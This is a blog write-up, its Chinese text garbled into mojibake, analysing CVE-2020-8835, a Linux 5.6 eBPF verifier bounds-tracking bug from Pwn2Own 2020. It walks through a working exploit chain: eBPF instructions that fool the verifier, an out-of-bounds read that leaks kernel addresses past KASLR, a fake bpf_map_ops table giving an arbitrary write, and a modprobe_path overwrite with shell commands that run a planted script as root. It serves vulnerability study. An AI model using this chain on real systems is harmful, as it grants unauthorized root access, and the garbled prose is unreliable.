
# CVE-2020-8835 pwn2own 2020 ebpf ææƒæ¼æ´åˆ†æ


                                é˜…è¯»é‡ Â Â 
                                **467737**
                            
                        |
                        
                                                            è¯„è®º
                                <b>
                                    <a target="_blank">5</a>
                                </b>
                                                                                                                                    ![](./img/203416/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/203416/t010f945215a6223853.jpg)](./img/203416/t010f945215a6223853.jpg)



pwn2own 2020 ä¸ŠManfred Paul ([writeup](https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification)ã€‚

è¿™ç¯‡æ–‡ç« ä¸­ï¼Œå‚è€ƒzdiä¸Šçš„writeup, æˆ‘ä¼šåˆ†æè¿™ä¸ªæ¼æ´çš„æˆå› ï¼Œç„¶åå†™ä¸€ä¸‹è¿™ä¸ªæ´çš„ expï¼Œ çº¯å±ä¸ªäººç¬”è®°ï¼Œç†è§£æœ‰è¯¯çš„åœ°æ–¹æ¬¢è¿æŒ‡æ­£ã€‚



## ç¯å¢ƒæ­å»º

æ–‡ç« æ¶‰åŠåˆ°çš„æ–‡ä»¶éƒ½æ”¾åœ¨äº†[è¿™é‡Œ](https://github.com/rtfingc/cve-repo/tree/master/0x04-pwn2own-ebpf-jmp32-cve-2020-8835), æˆ‘ç”¨çš„æ˜¯[linux-5.6](https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.6.tar.xz) ç‰ˆæœ¬çš„å†…æ ¸ï¼Œåœ¨ ubuntu1804 ä¸‹ç¼–è¯‘æµ‹è¯•ã€‚



## æ¼æ´åˆ†æ

è¿™ä¸ªæ¼æ´æ˜¯åœ¨[commit 581738a681b6](https://github.com/torvalds/linux/commit/581738a681b6faae5725c2555439189ca81c0f1f)å¼•å…¥çš„ï¼Œ å®ƒæ·»åŠ äº†ä¸€ä¸ªå‡½æ•°

```
static void __reg_bound_offset32(struct bpf_reg_state *reg)
{
    u64 mask = 0xffffFFFF;
    struct tnum range = tnum_range(reg-&gt;umin_value &amp; mask,
                       reg-&gt;umax_value &amp; mask);
    struct tnum lo32 = tnum_cast(reg-&gt;var_off, 4);
    struct tnum hi32 = tnum_lshift(tnum_rshift(reg-&gt;var_off, 32), 32);

    reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));
}
```

æ¼æ´å‘ç”Ÿåœ¨ `verifier` é˜¶æ®µï¼Œè¿™ä¸ªé˜¶æ®µä¼šæ¨¡æ‹Ÿè¿è¡Œä¼ è¿›æ¥çš„bpfæŒ‡ä»¤ï¼Œ`bpf_reg_state` ç”¨æ¥ä¿å­˜å¯„å­˜å™¨çš„çŠ¶æ€ä¿¡æ¯

```
ptype struct bpf_reg_state
type = struct bpf_reg_state {
    enum bpf_reg_type type;
    union {
        u16 range;
        struct bpf_map *map_ptr;
        u32 btf_id;
        unsigned long raw;
    };
    s32 off;
    u32 id;
    u32 ref_obj_id;
    struct tnum var_off;
    s64 smin_value;//æœ‰ç¬¦å·æ—¶å¯èƒ½çš„æœ€å°å€¼
    s64 smax_value;//æœ‰ç¬¦å·æ—¶å¯èƒ½çš„æœ€å¤§å€¼
    u64 umin_value;
    u64 umax_value;
    struct bpf_reg_state *parent;
    u32 frameno;
    s32 subreg_def;
    enum bpf_reg_liveness live;
    bool precise;
}
```

`smin_value` å’Œ `smax_value` ä¿å­˜å½“å¯„å­˜å™¨è¢«å½“åšæ˜¯æœ‰ç¬¦å·æ•°çš„æ—¶å€™å¯èƒ½çš„å–å€¼èŒƒå›´ï¼ŒåŒæ ·`umin_value` å’Œ`umax_value` è¡¨ç¤ºçš„æ˜¯æ— ç¬¦å·çš„æ—¶å€™ã€‚ `var_of` æ˜¯`struct tnum` ç±»å‹

```
ptype struct tnum
type = struct tnum {
    u64 value;
    u64 mask;
}
```

å®ƒåªæœ‰ä¸¤ä¸ªæˆå‘˜

`value`: æŸä¸ªbitä¸º1 è¡¨ç¤ºè¿™ä¸ªå¯„å­˜å™¨çš„è¿™ä¸ªbit ç¡®å®šæ˜¯1

`mask`: æŸä¸ªbit ä¸º1è¡¨ç¤ºè¿™ä¸ª bit æ˜¯æœªçŸ¥çš„

ä¸¾ä¸ªæ —å­ï¼Œå‡å¦‚`value` æ˜¯ `010`ï¼ˆäºŒè¿›åˆ¶è¡¨ç¤º) ï¼Œ `mask` æ˜¯`100` , é‚£ä¹ˆå°±æ˜¯ç»è¿‡å‰é¢çš„æŒ‡ä»¤çš„æ¨¡æ‹Ÿæ‰§è¡Œä¹‹åï¼Œå¯ä»¥ç¡®å®šè¿™ä¸ªå¯„å­˜å™¨çš„ ç¬¬äºŒä¸ªbit ä¸€å®šæ˜¯ 1, ç¬¬ä¸‰ä¸ª bit åœ¨`mask` é‡Œé¢è®¾ç½®äº†ï¼Œè¡¨ç¤ºè¿™é‡Œä¸ç¡®å®šï¼Œå¯ä»¥æ˜¯1æˆ–è€…æ˜¯0ã€‚è¯¦ç»†çš„æ–‡æ¡£å¯ä»¥åœ¨`Documentnetworking/filter.txt` é‡Œé¢æ‰¾åˆ°ã€‚

å¯¹äºè·³è½¬æŒ‡ä»¤, å‡å¦‚å½“å‰é‡åˆ°äº†ä¸‹é¢è¿™æ ·ä¸€æ¡æŒ‡ä»¤ï¼Œ

`BPF_JMP_IMM(BPF_JGE, BPF_REG_5, 8, 3)`

ä¼šæœ‰ä¸‹é¢è¿™æ ·ä¸¤è¡Œä»£ç æ¥æ›´æ–°çŠ¶æ€ï¼Œ`false_reg` å’Œ`true_reg` åˆ†åˆ«ä»£è¡¨ä¸¤ä¸ªåˆ†æ”¯çš„çŠ¶æ€ï¼Œ è¿™æ˜¯æˆ‘ä»¬å‰é¢`__reg_bound_offset32` çš„64ä½ç‰ˆæœ¬

```
__reg_bound_offset(false_reg);
    __reg_bound_offset(true_reg);
```

è¿™æ¡æŒ‡ä»¤ `r5 &gt;= 8` çš„æ—¶å€™ ï¼Œ ä¼šè·³åˆ°`pc+3` çš„åœ°æ–¹æ‰§è¡Œ(æ­£ç¡®åˆ†æ”¯), é‚£ä¹ˆåœ¨é”™è¯¯çš„åˆ†æ”¯ä¸Šï¼Œ`r5` è‚¯å®šæ˜¯ å°äº 8 äº†ï¼Œ

`__reg_bound_offset32` ä¼šåœ¨ä½¿ç”¨`BPF_JMP32` çš„æ—¶å€™è°ƒç”¨ï¼Œebpf çš„`BPF_JMP` å¯„å­˜å™¨ä¹‹é—´æ˜¯64bitæ¯”è¾ƒçš„ï¼Œæ¢æˆ`BPF_JMP32` çš„æ—¶å€™å°±åªä¼šæ¯”è¾ƒä½32bit. æˆ‘ä»¬çœ‹çœ‹ä»–æ˜¯æ€ä¹ˆåšçš„

é¦–å…ˆæ˜¯æŠŠä¹‹å‰çŠ¶æ€è½¬ç§»çš„`umin_value` å’Œ`umax_value` åªå–ä½32bit , åˆ›å»ºä¸€ä¸ªæ–°çš„ tnumï¼Œ `lo32` æ˜¯å–åŸæ¥ `var_off` çš„ ä½32bit

```
struct tnum tnum_range(u64 min, u64 max)                            
 {                                                                   
     u64 chi = min ^ max, delta;
     // ä»å³å¾€å·¦æ•°ï¼Œç¬¬ä¸€ä¸ªä¸º1çš„bit æ˜¯å“ªä¸€ä½(ä»1å¼€å§‹æ•°)ï¼Œ è¡¨ç¤ºæ²¡æœ‰1
     // å¦‚:  fls64(0100)  ==  3
     u8 bits = fls64(chi);                                          

     /* special case, needed because 1ULL &lt;&lt; 64 is undefined */      
     if (bits &gt; 63)                                                  
         return tnum_unknown;                                        
     /* e.g. if chi = 4, bits = 3, delta = (1&lt;&lt;3) - 1 = 7.           
     |* if chi = 0, bits = 0, delta = (1&lt;&lt;0) - 1 = 0, so we return   
     |*  constant min (since min == max).                            
     |*/                                                             
     delta = (1ULL &lt;&lt; bits) - 1;                                     
     return TNUM(min &amp; ~delta, delta);                               
 }                                                                   

//.....    
u64 mask = 0xffffFFFF;
    struct tnum range = tnum_range(reg-&gt;umin_value &amp; mask,
                       reg-&gt;umax_value &amp; mask);
    struct tnum lo32 = tnum_cast(reg-&gt;var_off, 4);
    struct tnum hi32 = tnum_lshift(tnum_rshift(reg-&gt;var_off, 32), 32);
```

å¯¹äº`tnum_intersect` å¦‚æœ`a`å’Œ`b` æœ‰æŸä¸€ä¸ªbit æ˜¯1, é‚£ä¹ˆä»£è¡¨å·²ç»ç¡®å®šè¿™ä¸ªbitæ˜¯1äº†ï¼Œ æ‰€ä»¥è¿™é‡Œç”¨`|` çš„æ–¹å¼ï¼Œ ä¸¤è€…ä¿¡æ¯æ•´åˆèµ·æ¥æœ€åç”Ÿæˆä¸€ä¸ªæ–°çš„`var_off`

```
struct tnum tnum_intersect(struct tnum a, struct tnum b)     
{                                                            
    u64 v, mu;                                               

    v = a.value | b.value;                                   
    mu = a.mask &amp; b.mask;                                    
    return TNUM(v &amp; ~mu, mu);                                
}                                                            
//...
reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));
```

æ¼æ´å‘ç”Ÿçš„åŸå› æ˜¯è¿™é‡Œçš„å®ç°æ–¹å¼æœ‰é—®é¢˜ï¼Œè®¡ç®—`range` çš„æ—¶å€™ç›´æ¥å–ä½32bitï¼Œå› ä¸ºåŸæœ¬çš„`umin_value` å’Œ `umax_value` éƒ½æ˜¯64bitçš„ï¼Œ å‡å¦‚è®¡ç®—ä¹‹å‰`umin_value ==  1` ï¼Œ `umax_value == 1 0000 0001` , å–ä½32bitä¹‹åä»–ä»¬éƒ½ä¼šç­‰äº1ï¼Œè¿™æ ·rangeè®¡ç®—å®Œä¹‹å`TNUM(min &amp; ~delta, delta);` ï¼Œ `min = 1` , `delta = 0`

ç„¶ååˆ°`tnum_intersect` å‡½æ•°ï¼Œ å‡è®¾`a.value = 0` ï¼Œè®¡ç®—åçš„`v == 1` ï¼Œ`mu ==0` , æœ€åå¾—åˆ°çš„ `var_off` å°±æ˜¯å›ºå®šå€¼`1`, ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç®¡å¯„å­˜å™¨çœŸå®çš„å€¼æ˜¯æ€ä¹ˆæ ·ï¼Œåœ¨`verifier` è¿‡ç¨‹éƒ½ä¼šå®ƒå½“åšæ˜¯1ã€‚

#### <a class="reference-link" name="%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"></a>è°ƒè¯•åˆ†æ

æˆ‘ä»¬è°ƒè¯•çœ‹çœ‹å†…å­˜å…·ä½“æ˜¯æ€ä¹ˆæ ·çš„, é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªarray map, ebpfæŒ‡ä»¤ä¸­, è®©`r9 = map[1]`, `r6` æ˜¯æˆ‘ä»¬è¦ç”¨æ¥æµ‹è¯•æ¼æ´çš„å¯„å­˜å™¨ï¼Œä»`map[1]` ä¸­åŠ è½½å€¼åˆ°`r6` ä¸­(å…·ä½“å‚è€ƒåé¢çš„exp), è¿™æ · `verifier` å°±ä¸çŸ¥é“ `r6` æ˜¯ä»€ä¹ˆï¼Œè¿™æ—¶å€™çš„`var_off-&gt;value  = 0`

```
BPF_LDX_MEM(BPF_DW,6,9,0),
```

å› ä¸ºæˆ‘çš„è°ƒè¯•ç¯å¢ƒæ²¡æœ‰åŠæ³•è¿è¡Œ`bpftool`, é¦–å…ˆåœ¨[`kernel/bpf/syscall.c:125`](https://elixir.bootlin.com/linux/v5.6/source/kernel/bpf/syscall.c#L125) map_create çš„æ—¶å€™è·å–ä¸€ä¸‹ map çš„åœ°å€å€¼

```
static struct bpf_map *find_and_alloc_map(union bpf_attr *attr)        
{                                                                      
//....                                    
    map = ops-&gt;map_alloc(attr);  //&lt;====                                      
    if (IS_ERR(map))     // 125                                              
        return map;                                                    
//...                                           
    return map;                                                        
}
```

æ¥ä¸‹æ¥æ˜¯ä¸‹é¢çš„æŒ‡ä»¤, åœ¨`pc+1` çš„åœ°æ–¹ `umin_value` å˜æˆ1

```
BPF_JMP_IMM(BPF_JGE,6,1,1), 
BPF_EXIT_INSN(),
```

ç„¶åæ˜¯ä¸‹é¢çš„æŒ‡ä»¤, è¿™ä¸ªæ—¶å€™ `r8 =   0x100000001` , `BPF_JLE` çš„ `pc+1` åˆ†æ”¯ä¸Šï¼Œ `umax_value = 0x100000001` `

```
BPF_MOV64_IMM(8,0x1),                  
BPF_ALU64_IMM(BPF_LSH,8,32),           
BPF_ALU64_IMM(BPF_ADD,8,1),            
/*BPF_JLE  tnum  umax 0x100000001*/ 
BPF_JMP_REG(BPF_JLE,6,8,1),            
BPF_EXIT_INSN(),
```

ç„¶åæ—¶å€™ jmp32 æ¥è§¦å‘æ¼æ´äº†

```
BPF_JMP32_IMM(BPF_JNE,6,5,1),
BPF_EXIT_INSN(),
```

åœ¨Â·`__reg_bound_offset32` ä¸‹ä¸ªæ–­ç‚¹ï¼Œæˆ‘è¿™é‡Œæ˜¯åœ¨`kernel/bpf/verifier.c:1038`, `false_reg` å‡½æ•°æ‰§è¡Œå‰åå€¼å¦‚ä¸‹

```
var_off = {
   value = 0x5,
   mask = 0x100000000
 },
 smin_value = 0x1,
 smax_value = 0x100000001,
 umin_value = 0x1,
 umax_value = 0x100000001,
//--- æ‰§è¡Œå
 var_off = {
   value = 0x5,
   mask = 0x100000000
 },
 smin_value = 0x1,
 smax_value = 0x100000001,
 umin_value = 0x1,
 umax_value = 0x100000001,
```

`true_reg` åœ¨å‡½æ•°æ‰§è¡Œå‰åçš„å€¼å¦‚ä¸‹

```
var_off = {
  value = 0x0,
  mask = 0x1ffffffff
},
smin_value = 0x1,
smax_value = 0x100000001,
umin_value = 0x1,
umax_value = 0x100000001,
// --- æ‰§è¡Œå
  var_off = {
    value = 0x1,
    mask = 0x100000000
  },
  smin_value = 0x1,
  smax_value = 0x100000001,
  umin_value = 0x1,
  umax_value = 0x100000001,
```

å› ä¸º`r6` æ˜¯ä» `map[0]` load è¿›æ¥çš„ï¼Œå®é™…è¿è¡Œçš„æ—¶å€™å¯ä»¥æ˜¯ä»»ä½•å€¼ï¼Œè¿™é‡Œçš„åˆ¤æ–­é”™è¯¯äº†ï¼Œåé¢æˆ‘ä»¬å°±å¯ä»¥ç”¨å®ƒæ¥ç»•è¿‡ä¸€äº›æ£€æŸ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å…·ä½“æ€ä¹ˆæ ·åˆ©ç”¨ã€‚



## æ¼æ´åˆ©ç”¨

### <a class="reference-link" name="%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"></a>åœ°å€æ³„éœ²

åœ¨å‰é¢çš„æŒ‡ä»¤æ‰§è¡Œå®Œä¹‹åï¼Œ æ‰§è¡Œä¸‹é¢æŒ‡ä»¤ï¼Œæˆ‘ä»¬è®©ä¸€å¼€å§‹`r6 = 2` ï¼Œ è¿™æ · `verifier` è¿‡ç¨‹åˆ°äº†è¿™é‡Œï¼Œ`r6` ä¼šè¢«è®¤ä¸ºæ˜¯ 1,

`( 1&amp;2 )&gt;&gt;1 == 0`, ä½†æ˜¯å®é™…è¿è¡Œçš„æ—¶å€™ `(2 &amp; 2) &gt;&gt; 1 ==1`,

```
BPF_ALU64_IMM(BPF_AND, 6, 2),   
BPF_ALU64_IMM(BPF_RSH, 6, 1),
```

æ¥ä¸‹æ¥æˆ‘ä»¬è®©`r6  = r6 * 0x110` , è¿™æ · `verifier` è¿‡ç¨‹ä»ç„¶è®¤ä¸ºå®ƒæ˜¯0ï¼Œä½†æ˜¯è¿è¡Œè¿‡ç¨‹çš„å®é™…å€¼ç¡®å® `0x110`

```
BPF_ALU64_IMM(BPF_MUL,6,0x110),
```

æˆ‘ä»¬è·å–ä¸€ä¸ªmapï¼Œæˆ‘ä»¬å«å®ƒ`expmap` æŠŠï¼Œ `r7 =  expmap[0]`

```
BPF_MOV64_REG(7,0),
```

ç„¶å `r7 = r7 - r6`, å› ä¸º `r7` æ˜¯æŒ‡é’ˆç±»å‹ï¼Œ `verifier` ä¼šæ ¹æ®mapçš„ size æ¥æ£€æŸ¥è¾¹ç•Œï¼Œä½†æ˜¯`verifier` çš„æ—¶å€™è®¤ä¸º`r6 ==0` ï¼Œ`r7 - 0 == r7`, æ‰€ä»¥å¯ä»¥é€šè¿‡æ£€æŸ¥ï¼Œ ä½†æ˜¯è¿è¡Œçš„æ—¶å€™ æˆ‘ä»¬å¯ä»¥è®©`r7 =  r7 - 0x110`, ç„¶ååœ¨ `BPF_LDX_MEM(BPF_DW,8,7,0),` å°±å¯ä»¥åšè¶Šç•Œè¯»å†™äº†ã€‚

```
BPF_ALU64_REG(BPF_SUB,7,6)
```

ebpf ç”¨`bpf_map` æ¥ä¿å­˜map çš„ä¿¡æ¯ï¼Œ ä¹Ÿæ˜¯æˆ‘ä»¬å‰é¢`map_create` çš„æ—¶å€™å¾—åˆ°çš„é‚£ä¸ªåœ°å€

```
gefâ¤  kstruct bpf_map
ptype struct bpf_map
type = struct bpf_map {
    const struct bpf_map_ops *ops;
    struct bpf_map *inner_map_meta;
    void *security;
    enum bpf_map_type map_type;
    //....
    u64 writecnt;
}
```

åœ¨ `map_lookup_elem` çš„æ—¶å€™ï¼Œ ä½¿ç”¨çš„æ˜¯ `bpf_array` ï¼Œå®ƒçš„å¼€å¤´æ˜¯`bpf_map`, ç„¶å`value` å°±æ˜¯map çš„æ¯ä¸€ä¸ªé¡¹çš„æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ `bpf_map` åˆšå¥½åœ¨`r7` çš„ä½åœ°å€å¤„(`r7` æ˜¯ç¬¬ä¸€ä¸ª value)ï¼Œ è¿™é‡ŒæŸ¥çœ‹å†…å­˜å¯ä»¥çŸ¥é“ `map` åœ¨ `r7 - 0x110` çš„åœ°æ–¹

```
ptype struct bpf_array
type = struct bpf_array {
    struct bpf_map map;
    u32 elem_size;
    u32 index_mask;
    struct bpf_array_aux *aux;
    union {
        char value[];//&lt;--- elem
        void *ptrs[];
        void *pptrs[];
    };
}
```

äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥è¯»å†™ `bpf_map` æ¥åšåç»­çš„åˆ©ç”¨

é¦–å…ˆæ˜¯åœ°å€æ³„éœ²ï¼Œ `bpf_map` æœ‰ä¸€ä¸ª`const struct bpf_map_ops *ops;` å­—æ®µï¼Œå½“æˆ‘ä»¬åˆ›å»ºçš„mapæ˜¯`BPF_MAP_TYPE_ARRAY` çš„æ—¶å€™ä¿å­˜çš„æ˜¯`array_map_ops`, `array_map_ops` æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä¿å­˜åœ¨rdataæ®µï¼Œé€šè¿‡å®ƒæˆ‘ä»¬å°±å¯ä»¥è®¡ç®—kaslrçš„åç§»ï¼Œç»•è¿‡kaslr, åŒæ—¶è¿è¡Œçš„æ—¶å€™å¯ä»¥åœ¨ä¸‹é¢`wait_list` å¤„æ³„éœ²å‡ºmap çš„åœ°å€

```
gefâ¤  p/a *(struct bpf_array *)0xffff88800d878000              
$5 = {  
  map = {          
    ops = 0xffffffff82016340 &lt;array_map_ops&gt;,//&lt;-- æ³„éœ²å†…æ ¸åœ°å€
    inner_map_meta = 0x0 &lt;fixed_percpu_data&gt;,
    security = 0xffff88800e93f0f8,
    map_type = 0x2 &lt;fixed_percpu_data+2&gt;,
    key_size = 0x4 &lt;fixed_percpu_data+4&gt;,
    value_size = 0x2000 &lt;irq_stack_backing_store&gt;, 
    max_entries = 0x1 &lt;fixed_percpu_data+1&gt;,
//...    
    usercnt = {    
//..
      wait_list = {
        next = 0xffff88800d8780c0,//&lt;-- æ³„éœ² map åœ°å€
        prev = 0xffff88800d8780c0
      }
    },
    writecnt = 0x0 &lt;fixed_percpu_data&gt;
  },
  elem_size = 0x2000 &lt;irq_stack_backing_store&gt;,
  index_mask = 0x0 &lt;fixed_percpu_data&gt;,
  aux = 0x0 &lt;fixed_percpu_data&gt;,
  {
    value = 0xffff88800d878110,//&lt;-- r7
    ptrs = 0xffff88800d878110,
    pptrs = 0xffff88800d878110
  }
}
```

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%86%99"></a>ä»»æ„å†…å­˜å†™

æˆ‘ä»¬å¯ä»¥ç”¨`r7` å†™å…¥ `ops = 0xffffffff82016340 &lt;array_map_ops&gt;`, æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„`fake_ops`, å› ä¸ºå‰é¢æˆ‘ä»¬å·²ç»æ³„éœ²å‡ºmap çš„åœ°å€äº†ï¼Œé‚£ä¹ˆå®Œå…¨å¯ä»¥ç”¨`map_update_elem` ä¼ªé€ ä¸€ä¸ª`ops`, ç„¶åæ”¹ä¸€ä¸‹æŒ‡é’ˆå°±å¯ä»¥åŠ«æŒæ§åˆ¶æµäº†ï¼Œzdiä¸Šçš„writeup ç”¨äº†ä¸€ä¸ªæ›´å¥½çš„åŠæ³•ã€‚

```
gefâ¤  p/a *(struct bpf_map_ops *)0xffffffff82016340
$11 = {
  map_alloc_check = 0xffffffff8116ec70 &lt;array_map_alloc_check&gt;,
  map_alloc = 0xffffffff8116fa00 &lt;array_map_alloc&gt;,
  map_release = 0x0 &lt;fixed_percpu_data&gt;,
  map_free = 0xffffffff8116f2d0 &lt;array_map_free&gt;,
  map_get_next_key = 0xffffffff8116ed50 &lt;array_map_get_next_key&gt;,
  map_release_uref = 0x0 &lt;fixed_percpu_data&gt;,
  map_lookup_elem_sys_only = 0x0 &lt;fixed_percpu_data&gt;,
  map_lookup_batch = 0xffffffff81159b30 &lt;generic_map_lookup_batch&gt;,
  map_lookup_and_delete_batch = 0x0 &lt;fixed_percpu_data&gt;,
  map_update_batch = 0xffffffff81159930 &lt;generic_map_update_batch&gt;,
  map_delete_batch = 0x0 &lt;fixed_percpu_data&gt;,
  map_lookup_elem = 0xffffffff8116edd0 &lt;array_map_lookup_elem&gt;,
  map_update_elem = 0xffffffff8116f1c0 &lt;array_map_update_elem&gt;,
  map_delete_elem = 0xffffffff8116ed80 &lt;array_map_delete_elem&gt;,
  map_push_elem = 0x0 &lt;fixed_percpu_data&gt;,
  map_pop_elem = 0x0 &lt;fixed_percpu_data&gt;,
  map_peek_elem = 0x0 &lt;fixed_percpu_data&gt;,
  map_fd_get_ptr = 0x0 &lt;fixed_percpu_data&gt;,
  map_fd_put_ptr = 0x0 &lt;fixed_percpu_data&gt;,
  map_gen_lookup = 0xffffffff8116f050 &lt;array_map_gen_lookup&gt;,
  map_fd_sys_lookup_elem = 0x0 &lt;fixed_percpu_data&gt;,
  map_seq_show_elem = 0xffffffff8116ee80 &lt;array_map_seq_show_elem&gt;,
  map_check_btf = 0xffffffff8116f870 &lt;array_map_check_btf&gt;,
  map_poke_track = 0x0 &lt;fixed_percpu_data&gt;,
  map_poke_untrack = 0x0 &lt;fixed_percpu_data&gt;,
  map_poke_run = 0x0 &lt;fixed_percpu_data&gt;,
  map_direct_value_addr = 0xffffffff8116ece0 &lt;array_map_direct_value_addr&gt;,
  map_direct_value_meta = 0xffffffff8116ed10 &lt;array_map_direct_value_meta&gt;,
  map_mmap = 0xffffffff8116ee50 &lt;array_map_mmap&gt;
}
```

`map_push_elem` ä¼šåœ¨ `map_update_elem` çš„æ—¶å€™è¢«è°ƒç”¨, å®ƒéœ€è¦map çš„ç±»å‹æ˜¯`BPF_MAP_TYPE_QUEUE`æˆ–è€…`BPF_MAP_TYPE_STACK`, ä½†æ˜¯æ²¡æœ‰å…³ç³»ï¼Œ map ä¸Šçš„ä»»ä½•å†…å®¹éƒ½å¯ä»¥ç”¨ `r7` æ¥æ”¹ï¼ŒæŠŠ`map_type` æ”¹æˆ`BPF_MAP_TYPE_STACK` (0x17)ä¹‹åï¼Œæ¯æ¬¡è°ƒç”¨`map_update_elem`æ—¶, å°±ä¼šè°ƒç”¨`map_push_elem`

```
static int bpf_map_update_value(struct bpf_map *map, struct fd f, void *key,  
                void *value, __u64 flags)                                     
{                                                                             
//...                    
    } else if (map-&gt;map_type == BPF_MAP_TYPE_QUEUE ||     
        Â¦  map-&gt;map_type == BPF_MAP_TYPE_STACK) {         
        err = map-&gt;ops-&gt;map_push_elem(map, value, flags); 
//..
```

åœ¨ `fake_ops` ä¸Š, æˆ‘ä»¬æŠŠ`map_push_elem` æ”¹æˆ`map_get_next_key` ä¸€æ ·çš„åœ°å€ï¼Œ è¿™é‡Œå®é™…çš„`map_get_next_key`æ˜¯å‡½æ•°`array_map_get_next_key`

```
uint64_t fake_map_ops[]={

    kaslr +0xffffffff8116ec70,                 
    kaslr +0xffffffff8116fa00,                 
    0x0,                                       
    kaslr +0xffffffff8116f2d0,                 
    kaslr +0xffffffff8116ed50,// 5: map_get_next_key  
    0x0,                                       
    //...                
    kaslr +0xffffffff8116ed80,                 
    kaslr +0xffffffff8116ed50,//15: map_push_elem 
    0x0,                                       
    0x0,                                       
    //...                
}
```

`array_map_get_next_key` å®ç°åœ¨`kernel/bpf/arraymap.c#L279` ä¸Šï¼Œ ä¼ é€’ç»™`map_push_elem` çš„å‚æ•°æ˜¯`value`(ring3 è¦updateçš„æ•°æ®)å’Œ `uattr` çš„ flags, åˆ†åˆ«å¯¹åº”`array_map_get_next_key` çš„ `key` å’Œ `next_key` å‚æ•°

```
static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key)   
{                                                                                   
    struct bpf_array *array = container_of(map, struct bpf_array, map);             
    u32 index = key ? *(u32 *)key : U32_MAX;                                        
    u32 *next = (u32 *)next_key;                                                    

    if (index &gt;= array-&gt;map.max_entries) {    //index                                      
        *next = 0;                                                                  
        return 0;                                                                   
    }                                                                               

    if (index == array-&gt;map.max_entries - 1)                                        
        return -ENOENT;                                                             

    *next = index + 1;                                                              
    return 0;                                                                       
}
```

åŠ å…¥æˆ‘ä»¬è¿è¡Œ `map_update_elem(mapfd, &amp;key, &amp;value, flags)`, è¿è¡Œåˆ° `array_map_get_next_key` ä¹‹åæœ‰

`index  == value[0]`, `next = flags` ï¼Œ æœ€ç»ˆæ•ˆæœæ˜¯ `*flags  = value[0]`

value[0] å’Œ flags éƒ½æ˜¯ ring3 ä¸‹ä¼ å…¥çš„å€¼ï¼Œå‰é¢æˆ‘ä»¬å·²ç»æ³„éœ²äº†å†…æ ¸åœ°å€ï¼Œäºæ˜¯å°±å¯ä»¥é€šè¿‡ä¿®æ”¹ `flags` çš„å€¼å†™ä»»æ„å†…å­˜å•¦ã€‚å†™å…¥çš„indexè¦æ»¡è¶³`(index &gt;= array-&gt;map.max_entries)`, `map_entries` å¯ä»¥ç”¨`r7` æ”¹æˆ`0xffff ffff`

è¿™é‡Œindex å’Œ next éƒ½æ˜¯ u32 ç±»å‹ï¼Œ æ‰€ä»¥å°±æ˜¯ä»»æ„åœ°å€å†™ 4ä¸ªbyte.

å…·ä½“çš„æ“ä½œæ˜¯
- 1 å†™ r7 æ”¹å†™ ops åˆ° fake_ops ( map_push_elem æ”¹æˆ`array_map_get_next_key` åœ°å€)
<li>2 ä¿®æ”¹ map çš„ä¸€äº›å­—æ®µç»•è¿‡ä¸€äº›æ£€æŸ¥
<ul>
- spin_lock_off = 0
<li>max_entries = `0xffff ffff`
</li>
<li>map_type = `BPF_MAP_TYPE_STACK`
</li>
### <a class="reference-link" name="%E6%94%B9modprobe_path%20%E7%94%A8root%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"></a>æ”¹modprobe_path ç”¨rootä»»æ„å‘½ä»¤

å¯ä»¥ä»»æ„åœ°å€å†™è¿™ä¸ªèƒ½åŠ›è¿˜æ˜¯æŒºå¤§çš„äº†ï¼Œzdi çš„writeup ä¸Šæ˜¯é€šè¿‡æœç´¢ `init_pid_ns`ï¼Œ æ‰¾åˆ°å½“å‰çš„`task_struct`, ç„¶åå†™ cred æ¥è·å–ä¸€ä¸ª root shellã€‚

æ—¢ç„¶å·²ç»å¯ä»¥ä»»æ„åœ°å€å†™äº†ï¼Œè¿™é‡Œæˆ‘çš„åšæ³•æ˜¯æ”¹å†™`modprobe_path` , ç„¶åå°±å¯ä»¥ç”¨root æƒé™æ‰§è¡Œä»»æ„æŒ‡ä»¤äº†ï¼Œè™½ç„¶ä¸èƒ½èµ·root shellï¼Œ ä½†æ˜¯ä¹Ÿæ˜¯å¯ä»¥è¾¾åˆ°ææƒç›®çš„äº†(ä¸»è¦æ˜¯æ‡’ ğŸ˜› )

`/tmp` ç›®å½•ä¸‹ç”Ÿæˆ `/tmp/chmod` å’Œ `/tmp/fake` , `/tmp/chmod` å¯ä»¥æ”¹ `/flag` æ–‡ä»¶çš„æƒé™

```
void gen_fake_elf(){                                                       
    system("echo -ne '#!/bin/shn/bin/chmod 777 /flagn' &gt; /tmp/chmod");   
    system("chmod +x /tmp/chmod");                                         
    system("echo -ne '\xff\xff\xff\xff' &gt; /tmp/fake");                 
    system("chmod +x /tmp/fake");                                          
}
```

ç„¶åæŠŠ`modprobe_path` æ”¹æˆ `/tmp/chmod`, ç„¶åè¿è¡Œ `/tmp/fake` å°±å®Œäº‹å•¦

```
expbuf64[0] = 0x706d742f -1;                              
 bpf_update_elem(expmapfd,&amp;key,expbuf,modprobe_path);      
 expbuf64[0] = 0x6d68632f -1;                              
 bpf_update_elem(expmapfd,&amp;key,expbuf,modprobe_path+4);    
 expbuf64[0] = 0x646f -1;                                  
 bpf_update_elem(expmapfd,&amp;key,expbuf,modprobe_path+8);
```



## exp

